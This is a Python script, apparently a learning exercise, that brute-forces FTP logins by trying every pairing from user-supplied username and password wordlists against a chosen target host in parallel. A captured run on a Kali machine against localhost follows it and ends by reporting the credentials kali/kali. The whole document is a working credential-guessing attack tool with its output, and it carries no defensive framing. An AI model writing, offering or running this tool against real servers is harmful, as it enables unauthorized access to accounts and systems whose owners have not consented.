#!/usr/bin/python3
import ftplib
import multiprocessing

def brute_force(ip_address, user, password):
    """
    Attempt to log in to an FTP server using provided username and password.
    """
    try:
        ftp = ftplib.FTP(ip_address)  # Connect to the FTP server
        print(f"Testing user: {user}, password: {password}")
        
        response = ftp.login(user, password)  # Try logging in

        if "230" in response:  # FTP success response code
            print("\n[+] Successful brute-force attack!")
            print(f"User: {user} | Password: {password}\n")
            ftp.quit()  # Close FTP connection properly
            return (user, password)  # Return credentials if successful
        
        ftp.quit()  # Close connection if unsuccessful

    except ftplib.error_perm:
        # Incorrect login credentials
        pass

    except ftplib.error_temp as temp_error:
        print("[-] Temporary server error:", temp_error)

    except Exception as error:
        print("[-] Connection error:", error)

    return None


def main():
    print("****** FTP Py-Cracker ********")
    ip_address = input("Enter Target IP address/Host Name >> ")
    
    print("---- Provide Wordlists for Attack -----")
    user_list_path = input("Path to username wordlist >> ")
    pass_list_path = input("Path to password wordlist >> ")

    # Read usernames and passwords from wordlists
    with open(user_list_path, 'r') as users_file:
        users = [line.strip() for line in users_file.readlines()]
    
    with open(pass_list_path, 'r') as pass_file:
        passwords = [line.strip() for line in pass_file.readlines()]
    
    print("===========================================")
    print("[+] Beginning Brute-force Attack...")

    # Create a process pool with a limited number of workers
    pool = multiprocessing.Pool(processes=5)  # Adjust based on server limits

    # Generate all username-password combinations
    tasks = [(ip_address, user, password) for user in users for password in passwords]

    # Execute brute-force attack with limited parallelism
    results = pool.starmap(brute_force, tasks)

    # Close the pool to free resources
    pool.close()
    pool.join()

    # Print any successful credentials found
    for result in results:
        if result:
            print(f"[+] Valid credentials found: {result}")

if __name__ == "__main__":
    main()



'''
──(root㉿kali)-[/home/kali/python/ssh_ftp]
└─# python3 bruteforce_ftp.py
****** FTP Py-Cracker ********
Enter Target IP address/Host Name >> 127.0.0.1
---- Provide Wordlists for Attack -----
Path to username wordlist >> users.txt
Path to password wordlist >> passlist.txt
===========================================
[+] Beginning Brute-force Attack...
Testing user: root, password: tar
Testing user: user, password: allan
Testing user: root, password: allan
Testing user: user, password: tar
Testing user: admin, password: allan
Testing user: root, password: tor
Testing user: root, password: all
Testing user: user, password: all
Testing user: user, password: tor
Testing user: admin, password: all
Testing user: root, password: compa
Testing user: root, password: user
Testing user: user, password: user
Testing user: user, password: compa
Testing user: admin, password: user
Testing user: root, password: kali
Testing user: root, password: admin
Testing user: user, password: admin
Testing user: user, password: kali
Testing user: admin, password: admin
Testing user: admin, password: tar
Testing user: administrator, password: allan
Testing user: administrator, password: tar
Testing user: os, password: allan
Testing user: os, password: tar
Testing user: admin, password: tor
Testing user: administrator, password: all
Testing user: administrator, password: tor
Testing user: os, password: tor
Testing user: os, password: all
Testing user: admin, password: compa
Testing user: administrator, password: user
Testing user: administrator, password: compa
Testing user: os, password: compa
Testing user: os, password: user
Testing user: admin, password: kali
Testing user: administrator, password: admin
Testing user: administrator, password: kali
Testing user: os, password: kali
Testing user: os, password: admin
Testing user: allan, password: allan
Testing user: allan, password: tar
Testing user: kal, password: allan
Testing user: kal, password: tar
Testing user: home, password: allan
Testing user: allan, password: tor
Testing user: allan, password: all
Testing user: kal, password: all
Testing user: kal, password: tor
Testing user: home, password: all
Testing user: allan, password: compa
Testing user: kal, password: user
Testing user: allan, password: user
Testing user: kal, password: compa
Testing user: home, password: user
Testing user: allan, password: kali
Testing user: kal, password: admin
Testing user: allan, password: admin
Testing user: kal, password: kali
Testing user: home, password: admin
Testing user: home, password: tar
Testing user: ftp, password: allan
Testing user: ftp, password: tar
Testing user: kali, password: allan
Testing user: kali, password: tar
Testing user: ftp, password: all
Testing user: home, password: tor
Testing user: ftp, password: tor
Testing user: kali, password: all
Testing user: kali, password: tor
Testing user: ftp, password: user
Testing user: home, password: compa
Testing user: ftp, password: compa
Testing user: kali, password: user
Testing user: kali, password: compa
Testing user: ftp, password: admin
Testing user: home, password: kali
Testing user: ftp, password: kali
Testing user: kali, password: admin
Testing user: kali, password: kali

[+] Successful brute-force attack!
User: kali | Password: kali

[+] Valid credentials found: ('kali', 'kali')
'''
